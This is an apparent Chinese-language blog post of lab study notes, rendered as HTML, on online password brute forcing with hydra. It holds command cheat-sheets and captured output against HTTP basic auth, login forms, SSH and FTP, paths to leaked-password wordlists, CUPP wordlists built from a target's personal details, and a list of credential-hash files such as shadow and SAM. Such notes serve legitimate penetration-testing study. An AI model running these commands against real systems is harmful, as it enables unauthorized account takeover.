@@ -1,0 +1,835 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || brute forcing-hydra</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>brute forcing-hydra </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/10
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#00a596>
+                    base
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/tool" style=color:#03a9f4>
+                    tool
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>暴力攻击是一种试图通过自动探测来猜测密码或密钥的方法。暴力攻击的一个例子是密码破解。密码通常不会以明文形式存储在系统中，而是作为哈希值存储。 </p>
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hydra -h</code></td>
+<td>九头蛇帮助</td>
+</tr>
+<tr>
+<td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td>
+<td>基本身份验证暴力破解 - 组合词表</td>
+</tr>
+<tr>
+<td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td>
+<td>基本身份验证暴力破解 - 用户&#x2F;传递单词列表</td>
+</tr>
+<tr>
+<td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;</code></td>
+<td>登录表单暴力破解 - 静态用户，传递单词列表</td>
+</tr>
+<tr>
+<td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td>
+<td>SSH 暴力破解 - 用户&#x2F;传递词表</td>
+</tr>
+<tr>
+<td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td>
+<td>FTP 暴力破解 - 静态用户，传递单词列表</td>
+</tr>
+</tbody></table>
+<h1 id="单词列表"><a href="#单词列表" class="headerlink" title="单词列表"></a>单词列表</h1><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td>
+<td>默认密码单词列表</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td>
+<td>常用密码单词表</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td>
+<td>常用名称词表</td>
+</tr>
+</tbody></table>
+<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cupp -i</code></td>
+<td>创建自定义密码单词表</td>
+</tr>
+<tr>
+<td><code>sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt</code></td>
+<td>删除短于 8 的密码</td>
+</tr>
+<tr>
+<td><code>sed -ri &#39;/[!-/:-@\[-</code>{-~]+&#x2F;!d’ william.txt&#96;</td>
+<td>删除没有特殊字符的密码</td>
+</tr>
+<tr>
+<td><code>sed -ri &#39;/[0-9]+/!d&#39; william.txt</code></td>
+<td>删除没有数字的密码</td>
+</tr>
+<tr>
+<td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td>
+<td>生成用户名列表</td>
+</tr>
+<tr>
+<td><code>ssh b.gates@SERVER_IP -p PORT</code></td>
+<td>通过 SSH 到服务器</td>
+</tr>
+<tr>
+<td><code>ftp 127.0.0.1</code></td>
+<td>FTP 到服务器</td>
+</tr>
+<tr>
+<td><code>su - user</code></td>
+<td>切换到用户</td>
+</tr>
+</tbody></table>
+<p>以下是可以包含哈希密码的文件的小列表：</p>
+<table>
+<thead>
+<tr>
+<th><strong><code>Windows</code></strong></th>
+<th><strong><code>Linux</code></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>unattend.xml</td>
+<td>shadow</td>
+</tr>
+<tr>
+<td>sysprep.inf</td>
+<td>shadow.bak</td>
+</tr>
+<tr>
+<td>SAM</td>
+<td>password</td>
+</tr>
+</tbody></table>
+<p>由于密码不能从哈希值向后计算，因此暴力方法确定属于随机选择的密码的哈希值，直到哈希值与存储的哈希值匹配为止。在这种情况下，会找到密码。这种方法也称为离线暴力强制。本模块将侧重于在线暴力，并明确处理网站的登录表单。 在大多数网站上，总会有一个供管理员、作者和用户登录的区域。此外，用户名在网页上通常是可识别的，而复杂的密码很少被使用，因为它们很难记住。因此，如果我们不能确定任何初始立足点，那么在适当的枚举后使用在线暴力强制方法是值得的。 有许多工具和方法可用于强制登录，如：</p>
+<ul>
+<li><code>Ncrack</code></li>
+<li><code>wfuzz</code></li>
+<li><code>medusa</code></li>
+<li><code>patator</code></li>
+<li><code>hydra</code></li>
+<li>and others.</li>
+</ul>
+<p>在本模块中，我们将主要使用hydra，因为它是可用的最常见和最可靠的工具之一。 将讨论以下主题：</p>
+<ul>
+<li>Brute forcing basic HTTP auth</li>
+<li>Brute force for default passwords</li>
+<li>Brute forcing login forms</li>
+<li>Brute force usernames</li>
+<li>Creating personalized username and password wordlists based on our target</li>
+<li>Brute forcing service logins, such as FTP and SSH</li>
+</ul>
+<h1 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h1><p>HTTP规范提供了两种并行身份验证机制：</p>
+<ul>
+<li>Basic HTTP AUTH:基本HTTP AUTH用于向HTTP服务器验证用户。 </li>
+<li>Basic HTTP AUTH:代理服务器身份验证用于向中间代理服务器验证用户。</li>
+</ul>
+<p><strong>Password Attack Type</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>Dictionary attack</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Brute force</code></td>
+</tr>
+<tr>
+<td><code>Traffic interception</code></td>
+</tr>
+<tr>
+<td><code>Man In the Middle</code></td>
+</tr>
+<tr>
+<td><code>Key Logging</code></td>
+</tr>
+<tr>
+<td><code>Social engineering</code></td>
+</tr>
+</tbody></table>
+<p>字典攻击 蛮力 交通拦截 中间人 密钥日志记录 社会工程</p>
+<h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>Hydra是Login Brute Forcing的一个方便工具，因为它涵盖了各种各样的攻击和服务，并且与其他攻击和服务相比速度相对较快。它可以测试任何一对证书，并验证它们是否成功，但数量巨大，速度非常快。 如果我们想在自己的机器上使用它，我们可以使用“apt-install-hydra-y”，也可以从其Github存储库下载并使用它， 我们可以查看hydra提供的选项，并查看其标志和如何使用的示例：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -h
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+&lt;...SNIP...&gt;
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -u        loop around users, not passwords (effective! implied with -x)
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+
+&lt;...SNIP...&gt;
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+[DATA] attacking http-get://178.211.23.155:31099/
+[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
+[STATUS] attack finished for 178.211.23.155 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Options</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-C ftp-betterdefaultpasslist.txt</code></td>
+<td>Combined Credentials Wordlist</td>
+</tr>
+<tr>
+<td><code>SERVER_IP</code></td>
+<td>Target IP</td>
+</tr>
+<tr>
+<td><code>-s PORT</code></td>
+<td>Target Port</td>
+</tr>
+<tr>
+<td><code>http-get</code></td>
+<td>Request Method</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>Target Path</td>
+</tr>
+</tbody></table>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>target:46.101.95.166:30237</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101049862.png" alt="image-20230710104911976"></p>
+<p>主要是使用-C</p>
+<h1 id="Username-Brute-Force"><a href="#Username-Brute-Force" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h1><p>我们现在知道了hydra的基本用法，所以让我们尝试另一个通过使用用户名和密码的单独单词列表来攻击HTTP基本身份验证的例子。</p>
+<h2 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h2><p>最常用的密码单词列表之一是rockyou.txt，它有1400多万个唯一密码，按常见程度排序，这些密码是从网上泄露的密码和用户名数据库中收集的。基本上，除非密码真的是唯一的，否则这个单词列表很可能会包含它。Rockyou.txt已经存在于我们的Pwnbox中。如果我们在本地虚拟机上使用hydra，我们可以从 <a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">Hashcat GitHub Repository</a>存储库下载这个单词列表。</p>
+<h2 id="Username-x2F-Password-Attack"><a href="#Username-x2F-Password-Attack" class="headerlink" title="Username&#x2F;Password Attack"></a>Username&#x2F;Password Attack</h2><p>如果凭据在一个列表中，则Hydra至少需要3个特定标志才能对web服务执行暴力攻击： 资格证书 目标主机 目标路径 凭据也可以由用户名和密码分隔。我们可以将-L标志用于用户名单词列表，将-P标志用于密码单词列表。由于我们不想强行将所有用户名与列表中的密码相结合，我们可以通过指定标志-f来告诉hydra在第一次成功登录后停止。</p>
+<blockquote>
+<p>提示：我们将添加“-u”标志，以便它在每个密码上尝试所有用户，而不是在一个用户上尝试所有1400万个密码，然后再转到下一个。</p>
+</blockquote>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
+[DATA] attacking http-get://178.35.49.134:32901/
+[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active
+
+&lt;...SNIP...&gt;
+[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1
+
+[STATUS] attack finished for SERVER_IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<h2 id="Username-Brute-Force-1"><a href="#Username-Brute-Force-1" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h2><p>如果我们只是粗暴地使用用户名或密码，我们可以分配一个具有相同标志但小写的静态用户名或密码。例如，我们可以通过添加-l test，然后添加一个带有-P rockyou.txt的密码单词列表，对测试用户强制执行密码。 由于我们已经在上一节中找到了密码，我们可以使用“-p”标志静态地分配它，并且仅对可能使用此密码的用户名使用暴力。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
+[DATA] attacking http-get://178.35.49.134:32901/
+
+[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>target:46.101.95.166:30237</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101141107.png" alt="image-20230710114148111"></p>
+<p>这里要注意语句顺序问题</p>
+<h1 id="Hydra-Modules"><a href="#Hydra-Modules" class="headerlink" title="Hydra Modules"></a>Hydra Modules</h1><p>由于我们在渗透测试期间在Web服务器上为管理员找到了一个登录表单，因此这是一个非常有趣的组件，我们应该尝试在不产生太多网络流量的情况下访问它。最后，使用管理面板，我们可以管理服务器、它们的服务和配置。许多管理面板还实现了 <a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k shell</a> 等功能或元素，这些功能或元素可能允许我们直接执行操作系统命令。</p>
+<h2 id="Brute-Forcing-Forms"><a href="#Brute-Forcing-Forms" class="headerlink" title="Brute Forcing Forms"></a>Brute Forcing Forms</h2><p>Hydra提供了许多不同类型的请求，我们可以使用这些请求来强制执行不同的服务。如果我们使用hydra-h，我们应该能够列出支持的服务：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -h | grep &quot;Supported services&quot; | tr &quot;:&quot; &quot;\n&quot; | tr &quot; &quot; &quot;\n&quot; | column -e
+
+Supported			        ldap3[-&#123;cram|digest&#125;md5][s]	rsh
+services			        memcached					rtsp
+                            mongodb						s7-300
+adam6500			        mssql						sip
+asterisk			        mysql						smb
+cisco				        nntp						smtp[s]
+cisco-enable		        oracle-listener				smtp-enum
+cvs				            oracle-sid					snmp
+firebird			        pcanywhere					socks5
+ftp[s]				        pcnfs						ssh
+http[s]-&#123;head|get|post&#125;		pop3[s]						sshkey
+http[s]-&#123;get|post&#125;-form		postgres					svn
+http-proxy		        	radmin2						teamspeak
+http-proxy-urlenum		    rdp				  		    telnet[s]
+icq				            redis						vmauthd
+imap[s]		        		rexec						vnc
+irc				            rlogin						xmpp
+ldap2[s]		        	rpcap
+</code></pre>
+<p>在这种情况下，只有两种类型的http模块对我们感兴趣：</p>
+<ol>
+<li><code>http[s]-&#123;head|get|post&#125;</code></li>
+<li><code>http[s]-post-form</code></li>
+</ol>
+<p>第一个模块用于基本的HTTP身份验证，而第二个模块用于登录表单，如.php或.aspx等。 由于文件扩展名是“.php”，我们应该尝试http[s]-post-form模块。为了决定我们需要哪个模块，我们必须确定web应用程序是使用GET还是POST表单。我们可以通过尝试登录并关注URL来测试它。如果我们识别出我们的任何输入都被粘贴到了URL中，那么web应用程序将使用GET表单。否则，它将使用POST表单。</p>
+<p>要了解如何使用http post表单模块，我们可以使用“-U”标志列出它所需的参数和使用示例：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra http-post-form -U
+
+&lt;...SNIP...&gt;
+Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
+First is the page on the server to GET or POST to (URL).
+Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the
+ &quot;^USER^&quot; and &quot;^PASS^&quot; placeholders
+The third is the string that it checks for an *invalid* login (by default)
+ Invalid condition login check can be preceded by &quot;F=&quot;, successful condition
+ login check must be preceded by &quot;S=&quot;.
+
+&lt;...SNIP...&gt;
+
+Examples:
+ &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;
+</code></pre>
+<p>总之，我们需要提供三个参数，用：分隔，如下所示：</p>
+<ol>
+<li><code>URL path</code>, which holds the login form</li>
+<li><code>POST parameters</code> for username&#x2F;password</li>
+<li><code>A failed/success login string</code>, which lets hydra recognize whether the login attempt was successful or not</li>
+</ol>
+<p>如果我们提供一个失败的字符串，它将一直查找，直到在响应中找不到该字符串为止。另一种方法是，如果我们提供一个成功字符串，它将一直查找，直到在响应中找到该字符串。一个更好的策略是从登录页面的HTML源中选择一些内容。 我们必须选择的内容应该不太可能在登录后出现，比如登录按钮或密码字段。</p>
+<pre><code class="html">  &lt;form name=&#39;login&#39; autocomplete=&#39;off&#39; class=&#39;form&#39; action=&#39;&#39; method=&#39;post&#39;&gt;
+</code></pre>
+<p>我们在几个地方看到它作为标题&#x2F;标题，我们在上面显示的HTML表单中找到了我们的按钮。我们不必提供整个字符串，所以我们将使用&lt;form name&#x3D;’login’，它应该足够明显，并且在成功登录后可能不存在。 因此，http post表单的语法应该如下所示：</p>
+<pre><code class="bash">&quot;/login.php:[user parameter]=^USER^&amp;[password parameter]=^PASS^:F=&lt;form name=&#39;login&#39;&quot;
+</code></pre>
+<h1 id="Determine-Login-Parameters"><a href="#Determine-Login-Parameters" class="headerlink" title="Determine Login Parameters"></a>Determine Login Parameters</h1><p>如果我们使用Burp Suite拦截登录请求，或者仔细查看管理面板的源代码，我们可以很容易地找到POST参数。</p>
+<h1 id="Login-Form-Attacks"><a href="#Login-Form-Attacks" class="headerlink" title="Login Form Attacks"></a>Login Form Attacks</h1><p>在我们的情况下，我们没有任何关于现有用户名或密码的信息。由于我们列举了所有可用的端口，但无法确定任何有用的信息，因此我们可以选择结合http post-form模块测试web应用程序表单的默认凭据。</p>
+<h2 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h2><p>让我们尝试使用带有默认凭据的ftp-betterdefaultpasslist.txt列表来测试其中一个帐户是否已在web应用程序中注册。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;
+
+Hydra v9.1 (c) d020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<h2 id="Password-Wordlist"><a href="#Password-Wordlist" class="headerlink" title="Password Wordlist"></a>Password Wordlist</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;
+
+[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
+[STATUS] attack finished for 178.35.49.134 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>target : 46.101.95.166:30237</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307110951584.png" alt="image-20230711095122914"></p>
+<p>我们确定登录需要的参数：<code>username</code> <code>password</code></p>
+<p>然后使用hydra:</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111003116.png" alt="image-20230711100351354"></p>
+<pre><code>hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f 94.237.54.69 -s 44601 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot; 
+</code></pre>
+<p>验证一下：登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111005728.png" alt="image-20230711100520203"></p>
+<h1 id="Personalized-Wordlists"><a href="#Personalized-Wordlists" class="headerlink" title="Personalized Wordlists"></a>Personalized Wordlists</h1><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><p>我们通过指定-i参数以交互模式运行它，并回答一系列问题可以得到一个个性化密码本：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cupp -i
+
+___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don&#39;t know all the info, just hit enter when asked! ;)
+
+&gt; First Name: William
+&gt; Surname: Gates
+&gt; Nickname: Bill
+&gt; Birthdate (DDMMYYYY): 28101955
+
+&gt; Partners) name: Melinda
+&gt; Partners) nickname: Ann
+&gt; Partners) birthdate (DDMMYYYY): 15081964
+
+&gt; Child&#39;s name: Jennifer
+&gt; Child&#39;s nickname: Jenn
+&gt; Child&#39;s birthdate (DDMMYYYY): 26041996
+
+&gt; Pet&#39;s name: Nila
+&gt; Company name: Microsoft
+
+&gt; Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
+&gt; Do you want to add special chars at the end of words? Y/[N]: y
+&gt; Do you want to add some random numbers at the end of words? Y/[N]:y
+&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to william.txt, counting 43368 words.
+[+] Now load your pistolero with william.txt and shoot! Good luck!
+</code></pre>
+<p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p>
+<h2 id="Password-Policy"><a href="#Password-Policy" class="headerlink" title="Password Policy"></a>Password Policy</h2><p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p>
+<pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8
+sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special chars
+sed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers
+</code></pre>
+<h2 id="Mangling"><a href="#Mangling" class="headerlink" title="Mangling"></a>Mangling</h2><p>仍然可以为该列表中的每个单词创建许多排列。我们永远不知道我们的目标在创建密码时是怎么想的，因此我们最安全的选择是添加尽可能多的更改和排列，并注意到这当然需要更多的时间来使用暴力。 许多伟大的工具可以快速轻松地进行单词处理和大小写排列，比如 <a target="_blank" rel="noopener" href="https://github.com/digininja/RSMangler">rsmangler</a>或 <a target="_blank" rel="noopener" href="https://github.com/sc0tfree/mentalist.git">The Mentalist</a>。这些工具还有许多其他选项，可以使任何小的单词列表达到数百万行。我们应该记住这些工具，因为我们可能在其他模块和情况下需要它们。 作为一个起点，我们将坚持我们迄今为止生成的单词列表，不对其进行任何篡改。如果我们的单词列表没有成功登录，我们将返回这些工具并进行一些篡改，以增加我们猜测密码的机会。</p>
+<h2 id="Custom-Username-Wordlist"><a href="#Custom-Username-Wordlist" class="headerlink" title="Custom Username Wordlist"></a>Custom Username Wordlist</h2><p>我们还应该考虑根据此人的可用详细信息创建一个个性化的用户名单词列表。例如，此人的用户名可以是b.gates或gates或bill，以及许多其他可能的变体。有几种方法可以创建潜在用户名列表，其中最基本的方法就是手动编写。 我们可以使用的一个工具是 <a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a>，我们可以从GitHub克隆它，如下所示：</p>
